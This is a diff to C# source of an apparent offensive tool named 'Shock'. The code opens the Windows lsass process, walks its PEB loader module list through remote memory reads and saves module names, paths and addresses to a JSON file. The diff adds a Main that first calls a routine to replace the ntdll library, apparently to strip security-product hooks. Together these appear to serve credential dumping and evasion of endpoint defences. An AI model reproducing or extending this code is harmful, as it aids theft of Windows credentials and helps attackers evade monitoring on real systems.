@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
+using static Shock.NT;
+
 
 namespace Shock
 {
@@ -201,21 +203,17 @@ namespace Shock
                 {
                     Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                 }
-                // Console.WriteLine("[+] Process_Basic_Information Address: \t\t0x" + pbi_addr.ToString("X"));
             }
 
             // Get PEB Base Address
             IntPtr peb_pointer = pbi_addr + peb_offset;
-            // Console.WriteLine("[+] PEB Address Pointer:\t\t\t0x" + peb_pointer.ToString("X"));
             IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
-            // Console.WriteLine("[+] PEB Address:\t\t\t\t0x" + pebaddress.ToString("X"));
 
             // Get Ldr 
             IntPtr ldr_pointer = pebaddress + ldr_offset;
             IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
 
             IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
-            // Console.WriteLine("[+] InInitializationOrderModuleList:\t\t0x" + InInitializationOrderModuleList.ToString("X"));
             IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
 
             IntPtr dll_base = (IntPtr)1337;
@@ -265,14 +263,11 @@ namespace Shock
         static void WriteToFile(string path, string content)
         {
             System.IO.File.WriteAllText(path, content);
-            Console.WriteLine("[+] JSON file generated.");
+            Console.WriteLine("[+] File " + path + " generated.");
         }
 
 
-        static void Main(string[] args)
-        {
-            Console.WriteLine("2 - Shock");
-
+        static void Shock(string file_name) {
             // Get process name
             string procname = "lsass";
 
@@ -355,12 +350,31 @@ namespace Shock
             string[] aux_array_1 = { };
             foreach (ModuleInformation modInfo in moduleInformationList)
             {
-                string[] aux_array_2 = { modInfo.Name.ToString(), modInfo.FullPath.ToString().Replace("\\","\\\\") , ("0x"+modInfo.Address.ToString("X")) , modInfo.Size.ToString() };
+                string[] aux_array_2 = { modInfo.Name.ToString(), modInfo.FullPath.ToString().Replace("\\", "\\\\"), ("0x" + modInfo.Address.ToString("X")), modInfo.Size.ToString() };
                 aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
-                
+
             }
             string shock_json_content = ToJsonArray(aux_array_1);
-            WriteToFile("shock.json", shock_json_content);
+            WriteToFile(file_name, shock_json_content);
+        }
+
+        static void Main(string[] args)
+        {
+            // Replace ntdll library
+            string option = "default";
+            string wildcard_option = "";
+            if (args.Length >= 1)
+            {
+                option = args[0];
+            }
+            if (args.Length >= 2)
+            {
+                wildcard_option = args[1];
+            }
+            ReplaceLibrary(option, wildcard_option);
+
+            // Get modules (ModuleList) information. Argument: Name of JSON file
+            Shock("shock.json");
         }
     }
 }
